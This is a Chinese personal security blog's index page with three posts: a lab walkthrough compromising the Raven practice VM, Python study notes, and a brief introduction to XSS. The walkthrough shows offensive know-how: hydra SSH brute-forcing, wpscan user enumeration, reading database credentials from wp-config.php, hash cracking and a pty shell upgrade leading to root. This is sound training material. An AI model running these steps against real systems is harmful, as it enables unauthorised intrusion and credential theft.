<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="鸡翅儿">










<meta property="og:type" content="website">
<meta property="og:title" content="鸡翅儿">
<meta property="og:url" content="http://wcute.github.io/page/3/index.html">
<meta property="og:site_name" content="鸡翅儿">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="鸡翅儿">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://wcute.github.io/page/3/">





  <title>鸡翅儿</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">鸡翅儿</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/渗透测试-靶机Raven/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="鸡翅儿">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/渗透测试-靶机Raven/" itemprop="url">渗透测试-靶机Raven</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
                    <span itemprop="name">内网渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>参考链接：<a href="https://www.anquanke.com/post/id/163996" target="_blank" rel="noopener">https://www.anquanke.com/post/id/163996</a></p>
<p>攻击机 ip：192.168.195.133<br>靶机 ip：192.168.195.139</p>
<ol>
<li>探测存活主机<blockquote>
<p>root@kali:~# arp-scan -l </p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-b8ca7963f8b2df0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<ol start="2">
<li>端口探测（<code>nmap</code>为例）<blockquote>
<p>root@kali:~# nmap -sV -p- 192.168.195.139</p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-beb2dacfe6a374ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<ol start="3">
<li>使用 <code>Dirbuster</code> 工具进行敏感目录扫描</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4eaec0f613623e7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其中通过访问<code>vendor</code>目录发现<code>PHPMailerAutoload.php</code>文件，查询后发现<code>CVE-2016-10033</code>是<code>PHPMailer</code>中存在的高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。<br>CVE参考链接：<a href="https://paper.seebug.org/161/" target="_blank" rel="noopener">https://paper.seebug.org/161/</a></p>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3c88f4f47b440312.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过访问<code>service.html</code>查看源代码发现flag</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-832e8161ea9e72b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<ol start="4">
<li>由于发现<code>wordpress</code>目录，所以使用<code>Wpscan</code>扫描<br><code>Wpscan</code>是一个扫描<code>WordPress</code>漏洞的黑盒子扫描器，可以扫描出<code>wordpress</code>的版本，主题，插件，后台用户以及爆破后台用户密码等</li>
</ol>
<blockquote>
<p>root@kali:~# wpscan –url “<a href="http://192.168.195.139/wordpress&quot;" target="_blank" rel="noopener">http://192.168.195.139/wordpress&quot;</a> -e u vp<br><code>-e</code>   枚举方式<br><code>u</code>     id 为1-10的用户名<br><code>vp</code> 扫描脆弱插件</p>
</blockquote>
<p>探测到两个用户名，如图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-e4ec913e60c5e69e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<ol start="5">
<li>使用<code>hydra</code>对其进行<code>SSH</code>爆破<blockquote>
<p>root@kali:~# hydra -l michael -P ‘/root/Desktop/常用密码.dict’ -V -o ssh.log 192.168.195.139 ssh</p>
</blockquote>
</li>
</ol>
<p>破解出密码：“michael”（em…我其实没破解出来）</p>
<ol start="6">
<li>成功登录<code>ssh</code><blockquote>
<p>root@kali:~#ssh <a href="mailto:michael@192.168.195.139" target="_blank" rel="noopener">michael@192.168.195.139</a></p>
</blockquote>
</li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7839927e24636bbb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<p>查询到 <code>/var/www</code>目录下存放<code>flag2.txt</code></p>
<blockquote>
<p>michael@Raven:/var/www$ cat flag2.txt</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-67af668fdd262491.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<p>在<code>wordpress</code>的<code>wp_config.php</code>里找到<code>mysql</code>的账户密码</p>
<blockquote>
<p>michael@Raven:/var/www/html/wordpress$ vi wp-config.php</p>
</blockquote>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-7ca07e6e6a781951.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<ol start="7">
<li>上传一个大马并访问<br>通过连接<code>mysql</code>查询到<code>flag3</code> <code>flag4</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-1713571b428c5244.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></li>
</ol>
<p><img src="https://upload-images.jianshu.io/upload_images/12585049-8eafc11f6696014e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
<ol start="8">
<li>提权<br>对<code>steven</code>的<code>hash</code>值进行<code>md5</code>解密得到<code>pink84</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-3b314d24ec72dead.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br><img src="https://upload-images.jianshu.io/upload_images/12585049-a602b8f4d5fba6c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>由<code>python -c ’import pty; pty.spawn(&quot;/bin/sh&quot;)’</code>得到一个可以交互的<code>shell</code>，在有<code>root</code>密码的前提下可以<code>su</code>,<code>steven</code>是<code>root</code>账户<br><img src="https://upload-images.jianshu.io/upload_images/12585049-52640d3d45922438.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>成功提权至<code>root</code>账户</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python3-学习（2）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="鸡翅儿">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/python3-学习（2）/" itemprop="url">python3-学习（2）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Python/" itemprop="url" rel="index">
                    <span itemprop="name">Python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h5 id="python类的继承"><a href="#python类的继承" class="headerlink" title="python类的继承"></a>python类的继承</h5><pre><code>实例：

class people:
    name=&apos;&apos;
    age=0
    __weight=0    #定义私有属性,私有属性在类外部无法直接进行访问

    def __init__(self,n,a,w):
        self.name=n
        self.age=a
        self.__weight=w
    def speak(self):
        print (&quot;%s 说,我 %d 岁&quot;%(self.name,self.age))

class student(people):
    grade=&apos;&apos;
    def __init__(self,n,a,w,g):
        people.__init__(self,n,a,w)    # 调用父类的构函
        self.grade=g
    def speak(self):      # 覆写父类的方法
        print (&quot;%s 说,我 %d 岁,我在读 %s年级&quot;%(self.name,self.age,self.grade))

i=people(&quot;wu&quot;,45,&quot;50kg&quot;)
i.speak()        # wu 说,我 45 岁

s=student(&quot;liu&quot;,65,&quot;58kg&quot;,&quot;6&quot;)
s.speak()      # liu 说,我 65 岁,我在读6年级
</code></pre><h4 id="args-和-args用法"><a href="#args-和-args用法" class="headerlink" title="*args 和 **args用法"></a>*args 和 **args用法</h4><pre><code>def printinfo(name,age,**args):        #输入多余参数有变量名，就保存在**args中，保存方式为字典
    # 打印任何传入的字符串
    print (&quot;name:&quot;,name)
    print (&quot;age:&quot;,age)
    print (args)    
if __name__==&apos;__main__&apos;:
    printinfo(&quot;sad&quot;,18,a=123,b=5)

def max_num(*args):
    print (args)    # *args 以元组的方式传入
    print (max(args))

def test(name,age,*args1,**args2):    # 多余参数中既有*args类型，也有**args类型 必须*args在前，**args在后
    print (args1)
    print (args2)

max_num(44,12)

test(&quot;asd&quot;,15,85,12,a=123,b=478)    #在传递参数时，也需先传*args类型，再传**args

输出：
    name: sad
    age: 18
    {&apos;a&apos;: 123, &apos;b&apos;: 5}
    (44, 12)
    44
    (85, 12)
    {&apos;a&apos;: 123, &apos;b&apos;: 478}
</code></pre><h5 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h5><ul>
<li>base64原理：把3字节的二进制数据编码为4字节的文本数据，长度增加33%</li>
<li>编码后的文本数据可以在邮件正文、网页等直接显示编码的二进制数据不是3的倍数时，用 \x00 字节在末尾补足后，再在编码的末尾加上1个或2个=号，表示补了多少字节，解码时自动去掉</li>
<li>b’str’ 表示字节</li>
</ul>
<p>#####　文件操作</p>
<ul>
<li>打开文件的模式有(默认为文本模式)：<br>r ，只读模式【默认模式，文件必须存在，不存在则抛出异常】<br>w，只写模式【不可读；不存在则创建；存在则清空内容】<br>a， 之追加写模式【不可读；不存在则创建；存在则只追加内容】</li>
<li>对于非文本文件，我们只能使用b模式，”b”表示以字节的方式操作（而所有文件也都是以字节的形式存储的，使用这种模式无需考虑文本文件的字符编码、图片文件的jgp格式、视频文件的avi格式）<br>rb  wb ab<br>注：以b方式打开时，读取到的内容是字节类型，写入时也需要提供字节类型，不能指定编码</li>
</ul>
<h5 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h5><pre><code>模式             描述
^             匹配字符串的开头
$             匹配字符串的末尾    #  &apos;abc$&apos;匹配以&apos;abc&apos;结尾的字符串
.             匹配任意一个字符（除换行符），当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。
[...]         匹配在一个范围内的单个字符   #  [amk] 匹配 &apos;a&apos;，&apos;m&apos;或&apos;k&apos;
[^...]      不在[]中的字符      #  [^abc] 匹配除了a,b,c之外的字符。
r&apos;..&apos;       匹配原始字符集
re*         匹配0个或多个的表达式。
re+         匹配1个或多个的表达式。
re?         匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式
re{ n,}     精确匹配n个前面表达式。
re{ m, n}     匹配 m 到 n 次由前面的正则表达式定义的片段，贪婪方式
a| b         匹配a或b
(re)         G匹配括号内的表达式，也表示一个组
(?imx)         正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。
(?-imx)     正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。
(?: re)     类似 (...), 但是不表示一个组
(?imx: re)     在括号中使用i, m, 或 x 可选标志
(?-imx: re) 在括号中不使用i, m, 或 x 可选标志
(?#...)     注释.
(?= re)     前向肯定界定符。如果所含正则表达式，以 ... 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边
(?! re)     前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功
(?&gt; re)     匹配的独立模式，省去回溯。
\w             匹配字母数字及下划线
\W             匹配非字母数字及下划线
\s             匹配任意空白字符，等价于 [\t\n\r\f].
\S             匹配任意非空字符
\d             匹配任意数字，等价于 [0-9].
\D             匹配任意非数字
\A             匹配字符串开始
\Z             匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。c
\z             匹配字符串结束
\G             匹配最后匹配完成的位置。
\b             匹配一个单词边界，也就是指单词和空格间的位置。例如， &apos;er\b&apos; 可以匹配&quot;never&quot; 中的 &apos;er&apos;，但不能匹配 &quot;verb&quot; 中的 &apos;er&apos;。
\B             匹配非单词边界。&apos;er\B&apos; 能匹配 &quot;verb&quot; 中的 &apos;er&apos;，但不能匹配 &quot;never&quot; 中的 &apos;er&apos;。
\n, \t 等   匹配一个换行符，匹配一个制表符等
\1...\9     匹配第n个分组的内容。
\10         匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。
</code></pre><h5 id="re-compile-函数"><a href="#re-compile-函数" class="headerlink" title="re.compile()函数"></a>re.compile()函数</h5><p>定义: 根据包含正则表达式的字符串创建模式对象</p>
<p>格式: re.compile(pattern,flags=0)</p>
<p>匹配模式 flags  参数:</p>
<ul>
<li>re.I(re.IGNORECASE): 忽略大小写</li>
<li>re.M(MULTILINE): 多行模式，改变’^’和’$’的行为</li>
<li>re.S(DOTALL): 点任意匹配模式，改变’.’的行为</li>
<li>re.L(LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定</li>
<li>re.U(UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性</li>
<li>re.X(VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释 </li>
</ul>
<h5 id="re-match-函数"><a href="#re-match-函数" class="headerlink" title="re.match() 函数"></a>re.match() 函数</h5><ul>
<li>定义:<br>re.match 尝试从字符串的起始位置匹配一个模式，匹配成功re.match方法返回一个匹配的对象，如果不是起始位置匹配成功的话，match()就返回none</li>
<li><p>函数语法：</p>
<pre><code>re.match(匹配的正则表达式, 匹配的字符串, flags=0)  
</code></pre></li>
<li><p>实例： 邮箱地址验证</p>
<pre><code># 可进行两种邮箱地址验证 (1) some123@any.any (2) some.some@any.any

 import re

 r1=re.compile(&apos;^[a-zA-Z0-9]+@[a-zA-Z]+\.[a-zA-Z]{3}$&apos;)
 r2=re.compile(&apos;^[a-zA-Z]+\.[a-zA-Z]+@[a-zA-Z]+\.[a-zA-Z]{3}$&apos;)

 addr=input(&quot;please input email:&quot;)

 def email(addr):
     if r1.match(addr):
         print (&quot;输入地址合法&quot;)
         m=re.match(r1,addr)
         print (&quot;您输入的地址为：&quot;+m.group())
     elif r2.match(addr):
         print (&quot;输入地址合法&quot;)
         m=re.match(r2,addr)
         print (&quot;您输入的地址为：&quot;+m.group())
     else:
         print (&quot;false&quot;)

 email(addr)
</code></pre></li>
</ul>
<h5 id="re-search（）函数"><a href="#re-search（）函数" class="headerlink" title="re.search（）函数"></a>re.search（）函数</h5><p>定义: 返回成功匹配的第一个对象</p>
<h5 id="序列化-反序列化"><a href="#序列化-反序列化" class="headerlink" title="序列化 反序列化"></a>序列化 反序列化</h5><ul>
<li>变量从内存中变成可存储或传输的过程称之为序列化，python 中叫 pickling</li>
<li><p>变量内容从序列化的对象重新读到内存里称之为反序列化，即 unpickling</p>
<pre><code>实例：
import pickle

# 序列化

d = dict(name=&quot;wu&quot;,age=20)

file=pickle.dumps(d)    # pickle.dumps()方法把任意对象序列化成一个bytes
print (file)    # 输出 b&apos;\x80\x03}q\x00(X\x04\x00\x00\x00nameq\x01X\x02\x00\x00\x00wuq\x02X\x03\x00\x00\x00ageq\x03K\x14u.&apos;

f=open(&apos;dump.txt&apos;,&apos;wb&apos;)
pickle.dump(d,f)    # pickle.dump()直接把对象序列化后写入一个file-like Object
f.close()

# 反序列化

file1=pickle.loads(file)    # pickle.loads()方法先把内容读到一个bytes然后反序列化出对象
print (file1)    # 输出 {&apos;name&apos;: &apos;wu&apos;, &apos;age&apos;: 20}

f=open(&apos;dump.txt&apos;,&apos;rb&apos;)        #pickle.load()方法从一个file-like Object中直接反序列化出对象
file2=pickle.load(f)
f.close()
print (file2)    # 输出 {&apos;name&apos;: &apos;wu&apos;, &apos;age&apos;: 20}
</code></pre></li>
</ul>
<h5 id="JSON-用法"><a href="#JSON-用法" class="headerlink" title="JSON 用法"></a>JSON 用法</h5><ul>
<li>json.dumps()用于将dict类型的数据转成str</li>
<li>json.dump()用于将dict类型的数据转成str，并写入到json文件中</li>
<li>json.loads()用于将str类型的数据转成dict</li>
<li><p>json.load()用于从json文件中读取数据</p>
<pre><code>实例：
import json

f = open(&quot;shodan-export.json&quot;,&apos;r&apos;)
str = f.readlines()    #读取整个文件所有行，保存在一个列表(list)中，每行作为一个元素，但读取大文件会比较占内存。

ips = []
for line in str:
    str_json = json.loads(line)    #将json对象str类型转化为python字典（dict）
    ip = str_json[&apos;ip_str&apos;]        #获取键值为ip_str的value值
    ips.append(ip)
f.close()

f1 = open(&apos;iplist.txt&apos;,&quot;w&quot;)        #写入新文件
for ip in ips:
    f1.write(ip+&quot;\n&quot;)
f1.close()
</code></pre></li>
</ul>
<h5 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h5><ul>
<li>Socket是网络编程的一个抽象概念。通常我们用一个Socket表示“打开了一个网络链接”，而打开一个Socket需要知道目标计算机的IP地址和端口号，再指定协议类型即可。</li>
<li>创建Socket时，AF_INET 指定使用IPv4协议，AF_INET6 指定使用IPV6协议，SOCK_STREAM 指定使用面向流的TCP协议</li>
<li>参考链接： <a href="https://ciphersaw.me/2018/05/23/Python%20%E7%BB%9D%E6%8A%80%20%E2%80%94%E2%80%94%20TCP%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/" target="_blank" rel="noopener">https://ciphersaw.me/2018/05/23/Python%20%E7%BB%9D%E6%8A%80%20%E2%80%94%E2%80%94%20TCP%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/</a></li>
<li>socket 对象方法（服务端）：<br>s.bind(address)<br>s..listen(backlog)<br>s.accept()</li>
<li>socket 对象方法（客户端）：<br>s.connect(address)<br>s.connect_ex(address)</li>
<li>socket 对象方法（公共）：<br>s.recv(bufsize[,flag])<br>s.send(string[,flag])<br>s.send_all(string[,flag])<br>s.recvfrom(bufzize[,flag])<br>s.sendto(string[,flag],address)<br>s.close()：关闭套接字<br>s.getsockname()：返回套接字自己的地址，通常是一个元组（ipaddr,port）<br>s.getpeername() ：返回套接字远程地址，通常是一个元组（ipaddr,port）</li>
</ul>
<ul>
<li>Socket 编程实例：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">          # TCP 连接</span><br><span class="line"></span><br><span class="line">      import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((&apos;www.baidu.com&apos;,80))	# 建立连接</span><br><span class="line"></span><br><span class="line">s.send(b&apos;GET / HTTP/1.1\r\nHost: www.baidu.com\r\nConnection: close\r\n\r\n&apos;)	# 发送数据</span><br><span class="line"></span><br><span class="line">buffer=[]	#接收数据</span><br><span class="line">while True:</span><br><span class="line">	d=s.recv(1024)	#每次最多接受1k字节</span><br><span class="line">	if d:</span><br><span class="line">		buffer.append(d)	</span><br><span class="line">	else:</span><br><span class="line">		break</span><br><span class="line">data=b&apos;&apos;.join(buffer)	# join（）于将序列中的元素以指定的字符连接生成一个新的字符串</span><br><span class="line"></span><br><span class="line">s.close()	# 关闭连接</span><br><span class="line"></span><br><span class="line">header,html=data.split(b&apos;\r\n\r\n&apos;,1)    # 以\r\n\r\n为分隔符对接收到的data进行分割，分割1次</span><br><span class="line">print (header.decode(&apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">with open(&apos;baidu.html&apos;, &apos;wb&apos;) as f:	# 把接受的数据写入文件</span><br><span class="line">	f.write(html)	# 文件打开模式带b，写入文件内容时参数要用encode方法转为bytes形式，否则报错</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h5><ul>
<li><p>urllib的request模块可以非常方便地抓取URL内容，也就是发送一个GET请求到指定的页面，然后返回HTTP的响应</p>
<pre><code> 实例：
from urllib import request

with request.urlopen(&apos;https://www.baidu.com&apos;) as f:
    data=f.read()
    print (&apos;status:&apos;,f.status,f.reason)
    for k,v in f.getheaders():
        print (&apos;%s %s&apos; %(k,v))
    print (&apos;Data:&apos;,data.decode(&apos;utf-8&apos;))
</code></pre></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/XSS漏洞学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="鸡翅儿">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/XSS漏洞学习/" itemprop="url">XSS漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="XSS漏洞的原理"><a href="#XSS漏洞的原理" class="headerlink" title="XSS漏洞的原理"></a>XSS漏洞的原理</h4><p>XSS漏洞是发生在目标网站中目标用户的浏览层面上，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就会发生。</p>
<h4 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h4><ul>
<li>获取用户或者管理员的Cookie</li>
<li>XSS蠕虫</li>
<li>钓鱼攻击</li>
<li>挂马</li>
<li>键盘记录等</li>
</ul>
<h4 id="以下是可能嵌入跨源的资源的一些示例："><a href="#以下是可能嵌入跨源的资源的一些示例：" class="headerlink" title="以下是可能嵌入跨源的资源的一些示例："></a>以下是可能嵌入跨源的资源的一些示例：</h4><ul>
<li><script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同浪脚本中捕</li>
<li>&lt;link rel=”stylesheet” href＝”…”＞标签嵌入CSS。由于CSS的松散的语法规<br>则，CSS的跨域需要一个设置正确的 Content－Type消息头。不同浏览器有不同的限<br>制：IE， Firefox， Chrome， Safari（跳至CVE－2010－0051）部分和 Opera</li>
<li><img>嵌入图片。支持的图片格式包括PNG，JPEG，GlF，BMP，SVG，</li>
<li><video>和<audio>嵌入多媒体资源。</audio></video></li>
<li><object>，<embed>和<applet>的插件</applet></object></li>
<li>@font-face引入的字体。一些浏览器允许跨域字体（ cross－origin fonts），一些需要同<br>源字体（ same－origin fonts）</li>
<li><frame>和<iframe>载入的任何资源。站点可以使用 X-frame-optionsi消息头来阻止这<br>种形式的跨域交互。</iframe></li>
</ul>
